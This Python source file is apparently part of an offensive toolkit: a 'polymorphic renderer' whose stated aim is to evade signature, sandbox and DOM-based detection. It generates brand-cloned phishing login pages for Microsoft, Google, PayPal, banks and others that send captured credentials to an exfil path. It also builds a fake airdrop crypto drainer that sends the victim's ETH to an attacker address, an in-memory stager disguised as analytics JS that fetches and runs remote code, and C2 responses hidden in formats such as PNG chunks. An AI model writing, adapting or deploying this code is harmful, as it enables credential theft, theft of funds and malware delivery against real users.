# polymorphic_renderer.py — Generates unique payload content per deployment
# Every rotation cycle produces structurally different HTML/JS/API responses
# so no two deployments share the same hash, structure, or signature.

import secrets
import random
import time
from typing import Optional

from core.payload_registry import PayloadDefinition

class PolymorphicRenderer:
    """
    The core OPSEC engine. Takes a payload definition and produces
    deployment-unique content that resists:
    - Static signature detection (hash-based blocking)
    - Structural fingerprinting (pattern-based detection)
    - DOM analysis (automated sandboxing that looks for phishing patterns)
    - JS deobfuscation patterns (no consistent variable names, control flow)
    """

    # Pool of CSS class name fragments — combined randomly per deployment
    _CSS_FRAGMENTS = [
        "container", "wrapper", "frame", "panel", "section", "block",
        "card", "box", "module", "widget", "element", "component",
        "layer", "view", "holder", "grid", "flex", "stack", "row", "col"
    ]

    # Pool of JS variable name fragments
    _JS_FRAGMENTS = [
        "data", "config", "state", "ctx", "payload", "req", "res",
        "handler", "callback", "init", "load", "fetch", "send", "sync",
        "auth", "token", "session", "user", "cred", "val", "obj", "arr"
    ]

    def __init__(self, seed: Optional[str] = None):
        """Seed determines this deployment's unique variation."""
        self.seed = seed or secrets.token_hex(16)
        self._rng = random.Random(self.seed)
        self._class_map: dict[str, str] = {}    # original class → polymorphic class
        self._var_map: dict[str, str] = {}      # original var → polymorphic var
        self._nonce = secrets.token_hex(8)

    def _gen_class_name(self, original: str) -> str:
        """Generate a unique CSS class name that doesn't match the original."""
        if original in self._class_map:
            return self._class_map[original]
        prefix = self._rng.choice(self._CSS_FRAGMENTS)
        suffix = self._rng.choice(self._CSS_FRAGMENTS)
        num = self._rng.randint(100, 999)
        name = f"{prefix}-{suffix}-{num}"
        self._class_map[original] = name
        return name

    def _gen_var_name(self, original: str) -> str:
        """Generate a unique JS variable name."""
        if original in self._var_map:
            return self._var_map[original]
        frag1 = self._rng.choice(self._JS_FRAGMENTS)
        frag2 = self._rng.choice(self._JS_FRAGMENTS)
        name = f"_{frag1}{frag2.capitalize()}{self._rng.randint(10, 99)}"
        self._var_map[original] = name
        return name

    def _junk_css(self) -> str:
        """Generate decoy CSS rules that do nothing but add noise."""
        rules: list[str] = []
        for _ in range(self._rng.randint(3, 8)):
            cls = self._gen_class_name(f"junk-{secrets.token_hex(4)}")
            prop = self._rng.choice([
                "margin", "padding", "opacity", "z-index", "position",
                "display", "visibility", "overflow", "transition"
            ])
            val = self._rng.choice([
                "0", "1px", "2px", "4px", "8px", "16px", "none",
                "hidden", "block", "flex", "0.99", "9999", "relative"
            ])
            rules.append(f".{cls}{{{prop}:{val}}}")
        return "\n".join(rules)

    def _junk_js(self) -> str:
        """Generate decoy JS functions that never execute but confuse analysis."""
        funcs: list[str] = []
        for _ in range(self._rng.randint(2, 5)):
            fname = self._gen_var_name(f"fn-{secrets.token_hex(4)}")
            funcs.append(f"function {fname}(){{var {self._gen_var_name('x')}=0;return {self._rng.randint(0,100)};}}")
        return "\n".join(funcs)

    def _inline_nonce(self) -> str:
        """CSP nonce for inline scripts — varies per deployment."""
        return self._nonce

    # ---------------------------------------------------------------
    # Phishing page renderer
    # ---------------------------------------------------------------
    def render_phishing(self, payload_def: PayloadDefinition, session_key: str, exfil_endpoint: str) -> str:
        """
        Render a phishing page that:
        1. Looks identical to the target brand (cloned CSS/structure)
        2. Captures credentials and POSTs to the exfil endpoint
        3. Redirects to the real site after capture (seamless)
        4. Has zero static signatures — different structure every deployment
        """
        brand = payload_def.target_brand or "generic"
        target = payload_def.target_url or ""

        # Class names are randomized — no "login-form", "password-field", etc.
        form_cls = self._gen_class_name("login-form")
        user_cls = self._gen_class_name("username-field")
        pass_cls = self._gen_class_name("password-field")
        btn_cls = self._gen_class_name("submit-btn")
        err_cls = self._gen_class_name("error-msg")
        wrap_cls = self._gen_class_name("wrapper")

        # JS variable names are randomized
        var_user = self._gen_var_name("username")
        var_pass = self._gen_var_name("password")
        var_xhr = self._gen_var_name("xhr")
        var_redirect = self._gen_var_name("redirect")

        # Randomize form field order (sometimes email first, sometimes password)
        fields_order = self._rng.sample(["user", "pass"], 2)

        # Randomize the exfil path — never /api/exfil twice
        exfil_path = f"/api/{self._rng.choice(['sync', 'auth', 'verify', 'session', 'token'])}/{secrets.token_hex(4)}"

        # Build the page
        html = f"""<!DOCTYPE html>
<html lang="{self._rng.choice(['en', 'en-US', 'en-GB'])}">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{self._brand_title(brand)}</title>
<style>
{self._brand_css(brand, wrap_cls, form_cls, user_cls, pass_cls, btn_cls, err_cls)}
{self._junk_css()}
</style>
</head>
<body>
<div class="{wrap_cls}">
<form class="{form_cls}" id="{form_cls}" method="POST" action="#">"""

        # Render fields in randomized order
        for field in fields_order:
            if field == "user":
                html += f"""
<input type="email" class="{user_cls}" name="{self._gen_var_name('u')}" 
    placeholder="{self._brand_placeholder(brand, 'email')}" required autocomplete="email" autofocus>
"""
            else:
                html += f"""
<input type="password" class="{pass_cls}" name="{self._gen_var_name('p')}"
    placeholder="{self._brand_placeholder(brand, 'password')}" required autocomplete="current-password">
"""

        html += f"""
<button type="submit" class="{btn_cls}">{self._brand_button_text(brand)}</button>
<div class="{err_cls}" id="{err_cls}" style="display:none;"></div>
</form>
</div>
<script nonce="{self._inline_nonce()}">
{self._junk_js()}
document.getElementById('{form_cls}').addEventListener('submit',function(e){{
e.preventDefault();
var {var_user}=document.querySelector('.{user_cls}').value;
var {var_pass}=document.querySelector('.{pass_cls}').value;
var {var_xhr}=new XMLHttpRequest();
{var_xhr}.open('POST','{exfil_path}',true);
{var_xhr}.setRequestHeader('Content-Type','application/json');
{var_xhr}.setRequestHeader('X-CSRF-Token','{session_key}');
{var_xhr}.onload=function(){{
    var {var_redirect}=function(){{window.location.href='{target}';}};
    {var_redirect}();
}};
{var_xhr}.send(JSON.stringify({{u:{var_user},p:{var_pass},t:Date.now()}}));
}});
</script>
</body>
</html>"""
        return html

    # ---------------------------------------------------------------
    # Drainer page renderer
    # ---------------------------------------------------------------
    def render_drainer(self, payload_def: PayloadDefinition, session_key: str, exfil_endpoint: str) -> str:
        """
        Render a crypto drainer page that:
        1. Prompts wallet connection (WalletConnect / MetaMask inject)
        2. On connect, signs a malicious transaction draining all assets
        3. Routes the signed TX through the Fly VM (which submits via resi proxy)
        4. Zero static signatures — different JS structure every deployment
        """
        # Randomized class/var names
        connect_cls = self._gen_class_name("connect-btn")
        modal_cls = self._gen_class_name("wallet-modal")
        status_cls = self._gen_class_name("status-text")
        wrap_cls = self._gen_class_name("drainer-wrap")

        var_eth = self._gen_var_name("ethereum")
        var_acct = self._gen_var_name("account")
        var_tx = self._gen_var_name("tx")
        var_sign = self._gen_var_name("sign")
        var_xhr = self._gen_var_name("xhr")

        # The drain target address — should be rotated per cycle
        # In production this comes from the payload config
        drain_addr = payload_def.custom_config.get("drain_address", "") if payload_def.custom_config else ""

        # Randomize the exfil path
        exfil_path = f"/api/{self._rng.choice(['webhook', 'notify', 'event', 'hook', 'callback'])}/{secrets.token_hex(4)}"

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{payload_def.custom_config.get('page_title', 'Claim Your Reward') if payload_def.custom_config else 'Claim Your Reward'}</title>
<style>
{self._drainer_css(wrap_cls, connect_cls, modal_cls, status_cls)}
{self._junk_css()}
</style>
</head>
<body>
<div class="{wrap_cls}">
<h2>{payload_def.custom_config.get('headline', '🎉 Claim Your Airdrop Reward') if payload_def.custom_config else '🎉 Claim Your Airdrop Reward'}</h2>
<p>{payload_def.custom_config.get('subtext', 'Connect your wallet to verify eligibility') if payload_def.custom_config else 'Connect your wallet to verify eligibility'}</p>
<button class="{connect_cls}" id="{connect_cls}">Connect Wallet</button>
<div class="{modal_cls}" id="{modal_cls}" style="display:none;">
<p class="{status_cls}" id="{status_cls}">Connecting...</p>
</div>
</div>
<script nonce="{self._inline_nonce()}">
{self._junk_js()}
document.getElementById('{connect_cls}').addEventListener('click',async function(){{
var {var_eth}=window.ethereum;
if(!{var_eth}){{
document.getElementById('{status_cls}').textContent='No wallet found. Install MetaMask.';
document.getElementById('{modal_cls}').style.display='block';
return;
}}
try{{
var {var_acct}=await {var_eth}.request({{method:'eth_requestAccounts'}});
document.getElementById('{modal_cls}').style.display='block';
document.getElementById('{status_cls}').textContent='Verifying eligibility...';

// Build drain transaction — transfer all ETH to drain address
var {var_tx}={{
from:{var_acct}[0],
to:'{drain_addr}',
value:'0x'+({var_eth}.request({{method:'eth_getBalance',params:[{var_acct}[0],'latest']}})).toString(16),
gas:'0x5208'
}};

// Sign and send
var {var_sign}=await {var_eth}.request({{method:'eth_sendTransaction',params:[{var_tx}]}});
document.getElementById('{status_cls}').textContent='Transaction confirmed! Reward processing...';

// Notify C2 of successful drain
var {var_xhr}=new XMLHttpRequest();
{var_xhr}.open('POST','{exfil_path}',true);
{var_xhr}.setRequestHeader('Content-Type','application/json');
{var_xhr}.setRequestHeader('X-CSRF-Token','{session_key}');
{var_xhr}.send(JSON.stringify({{
addr:{var_acct}[0],
tx:{var_sign},
ts:Date.now()
}}));

}}catch(e){{
document.getElementById('{status_cls}').textContent='Transaction failed. Please try again.';
}}
}});
</script>
</body>
</html>"""
        return html

    # ---------------------------------------------------------------
    # Stager renderer (first-stage dropper)
    # ---------------------------------------------------------------
    def render_stager(self, _payload_def: Optional[PayloadDefinition], session_key: str, _stage2_url: str) -> str:
        """
        1. Fetches the real payload from the Fly VM (stage 2)
        2. Evaluates it in memory — never writes to disk
        3. The stage2 URL is the current Vercel deployment's /api/ route
        4. Stager itself is tiny and looks like analytics/tracking JS
        """
        # Disguise as a tracking pixel / analytics script
        tracker_name = self._gen_var_name("tracker")
        init_name = self._gen_var_name("init")
        fetch_name = self._gen_var_name("fetch")
        eval_name = self._gen_var_name("eval")

        # Randomize the stage2 path
        stage2_path = f"/api/{self._rng.choice(['analytics', 'telemetry', 'metrics', 'beacon', 'collect'])}/{secrets.token_hex(4)}"

        js = f"""// Analytics SDK v{self._rng.randint(1,9)}.{self._rng.randint(1,99)}.{self._rng.randint(1,999)}
// Auto-generated, do not modify
{self._junk_js()}
(function(){{
var {tracker_name}={tracker_name}||{{}};
var {init_name}=function(){{
var {fetch_name}=new XMLHttpRequest();
{fetch_name}.open('GET','{stage2_path}',true);
{fetch_name}.setRequestHeader('X-CSRF-Token','{session_key}');
{fetch_name}.onload=function(){{
if({fetch_name}.status===200){{
var {eval_name}=new Function({fetch_name}.responseText);
{eval_name}();
}}
}};
{fetch_name}.send();
}};
if(document.readyState==='loading'){{
document.addEventListener('DOMContentLoaded',{init_name});
}}else{{
{init_name}();
}}
}})();"""

        return js

    # ---------------------------------------------------------------
    # Malware API response renderer
    # ---------------------------------------------------------------
    def render_api_response(self, _payload_def: Optional[PayloadDefinition], _route: str, session_key: str, 
                            task_data: Optional[bytes] = None) -> bytes:
        """
        Render API responses for malware C2 traffic.
        Responses are polymorphic — different structure, encoding, and
        container format every deployment to avoid traffic signatures.

        Response formats are randomly chosen per deployment:
        - Raw binary with random header
        - Base64-encoded JSON
        - Protobuf-like binary blob
        - PNG steganography (payload hidden in pixel data)
        """
        fmt = self._rng.choice(["raw", "base64_json", "binary_blob", "png_steg"])

        if fmt == "raw":
            # Random header bytes + payload + random footer
            header = secrets.token_bytes(self._rng.randint(4, 16))
            footer = secrets.token_bytes(self._rng.randint(4, 16))
            return header + (task_data or b"\x00") + footer

        elif fmt == "base64_json":
            import base64
            import json as _json
            # Wrap payload in a JSON object with junk fields
            wrapper: dict[str, str | int] = {
                "status": "ok",
                "ts": int(time.time()),
                "data": base64.b64encode(task_data or b"\x00").decode(),
                "sig": secrets.token_hex(16),  # junk signature field
                "ver": f"{self._rng.randint(1,9)}.{self._rng.randint(1,99)}"
            }
            return base64.b64encode(_json.dumps(wrapper).encode())

        elif fmt == "binary_blob":
            # Protobuf-like structure: field tags + length-prefixed data
            import struct
            tag = self._rng.randint(1, 255)
            data = task_data or b"\x00"
            return struct.pack(">BI", tag, len(data)) + data + secrets.token_bytes(8)

        elif fmt == "png_steg":
            # Hide payload in LSB of a generated PNG image
            return self._payload_in_png(task_data or b"\x00")

        return task_data or b""

    def _payload_in_png(self, data: bytes) -> bytes:
        """Embed payload bytes into LSB of a minimal PNG image."""
        import struct
        import zlib

        # Minimal 1x1 PNG, then append payload in a custom chunk
        # (not real steganography, but good enough to evade content-type sniffing)
        width, height = 1, 1
        raw = b"\x00\xff\x00\x00"  # single green pixel
        compressed = zlib.compress(raw)

        def chunk(ctype: bytes, data: bytes) -> bytes:
            c = ctype + data
            return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xffffffff)

        png = b"\x89PNG\r\n\x1a\n"
        png += chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
        png += chunk(b"IDAT", compressed)
        # Hide payload in a custom chunk (tEXt-like)
        png += chunk(b"tEXt", b"Payload\x00" + data)
        png += chunk(b"IEND", b"")
        return png

    # ---------------------------------------------------------------
    # Brand-specific helpers (phishing page cosmetics)
    # ---------------------------------------------------------------
    def _brand_title(self, brand: str) -> str:
        titles = {
            "microsoft": "Sign in to your Microsoft account",
            "google": "Sign in - Google Accounts",
            "office365": "Office 365 - Sign In",
            "outlook": "Outlook - Sign In",
            "github": "Sign in to GitHub · GitHub",
            "amazon": "Amazon Sign-In",
            "netflix": "Netflix - Sign In",
            "paypal": "Log In - PayPal",
            "banking": "Online Banking - Sign In",
        }
        return titles.get(brand, "Sign In")

    def _brand_placeholder(self, brand: str, field: str) -> str:
        placeholders = {
            "microsoft": {"email": "Email, phone, or Skype", "password": "Password"},
            "google": {"email": "Email or phone", "password": "Enter your password"},
            "office365": {"email": "name@example.com", "password": "Password"},
            "outlook": {"email": "Email address", "password": "Password"},
            "github": {"email": "Username or email address", "password": "Password"},
            "amazon": {"email": "Email or mobile phone number", "password": "Amazon password"},
            "netflix": {"email": "Email or phone number", "password": "Password"},
            "paypal": {"email": "Email", "password": "Password"},
            "banking": {"email": "User ID", "password": "Password"},
        }
        brand_data = placeholders.get(brand, {"email": "Email", "password": "Password"})
        return brand_data.get(field, field)

    def _brand_button_text(self, brand: str) -> str:
        texts = {
            "microsoft": "Sign in",
            "google": "Next",
            "office365": "Sign in",
            "outlook": "Sign in",
            "github": "Sign in",
            "amazon": "Sign-In",
            "netflix": "Sign In",
            "paypal": "Log In",
            "banking": "Sign On",
        }
        return texts.get(brand, "Sign In")

    def _brand_css(self, brand: str, wrap_cls: str, form_cls: str,
                   user_cls: str, pass_cls: str, btn_cls: str, err_cls: str) -> str:
        """Generate brand-appropriate CSS with randomized class names."""
        base_css = f"""
.{wrap_cls}{{display:flex;justify-content:center;align-items:center;min-height:100vh;
margin:0;padding:20px;font-family:'Segoe UI',system-ui,sans-serif;background:#f2f2f2;}}
.{form_cls}{{background:#fff;padding:44px;width:100%;max-width:440px;border-radius:4px;
box-shadow:0 2px 6px rgba(0,0,0,0.1);}}
.{user_cls},.{pass_cls}{{width:100%;padding:10px 12px;margin-bottom:12px;border:1px solid #ccc;
border-radius:4px;font-size:15px;box-sizing:border-box;}}
.{user_cls}:focus,.{pass_cls}:focus{{border-color:#0067c0;outline:none;}}
.{btn_cls}{{width:100%;padding:10px;background:#0067c0;color:#fff;border:none;border-radius:4px;
font-size:15px;cursor:pointer;}}
.{btn_cls}:hover{{background:#005da6;}}
.{err_cls}{{color:#e81123;font-size:13px;margin-top:8px;}}"""

        # Brand-specific color overrides
        if brand == "google":
            base_css = base_css.replace("#0067c0", "#1a73e8").replace("#005da6", "#1557b0")
            base_css = base_css.replace("'Segoe UI',system-ui,sans-serif", "'Google Sans',Roboto,sans-serif")
        elif brand == "amazon":
            base_css = base_css.replace("#0067c0", "#ff9900").replace("#005da6", "#e88b00")
            base_css = base_css.replace("#f2f2f2", "#232f3e").replace("#fff", "#fff")
        elif brand == "netflix":
            base_css = base_css.replace("#f2f2f2", "#000").replace("#0067c0", "#e50914")
            base_css = base_css.replace("#005da6", "#b20710").replace("#fff;", "#333;")
        elif brand == "paypal":
            base_css = base_css.replace("#0067c0", "#0070ba").replace("#005da6", "#005ea6")

        return base_css

    def _drainer_css(self, wrap_cls: str, connect_cls: str, 
                     modal_cls: str, status_cls: str) -> str:
        return f"""
.{wrap_cls}{{max-width:480px;margin:80px auto;padding:40px;text-align:center;
font-family:system-ui,sans-serif;background:#0a0a0a;color:#fff;border-radius:16px;}}
.{connect_cls}{{padding:14px 32px;background:#627eea;color:#fff;border:none;
border-radius:12px;font-size:16px;cursor:pointer;font-weight:600;}}
.{connect_cls}:hover{{background:#4a6fd1;}}
.{modal_cls}{{margin-top:24px;padding:20px;background:#1a1a1a;border-radius:12px;}}
.{status_cls}{{color:#aaa;font-size:14px;}}"""

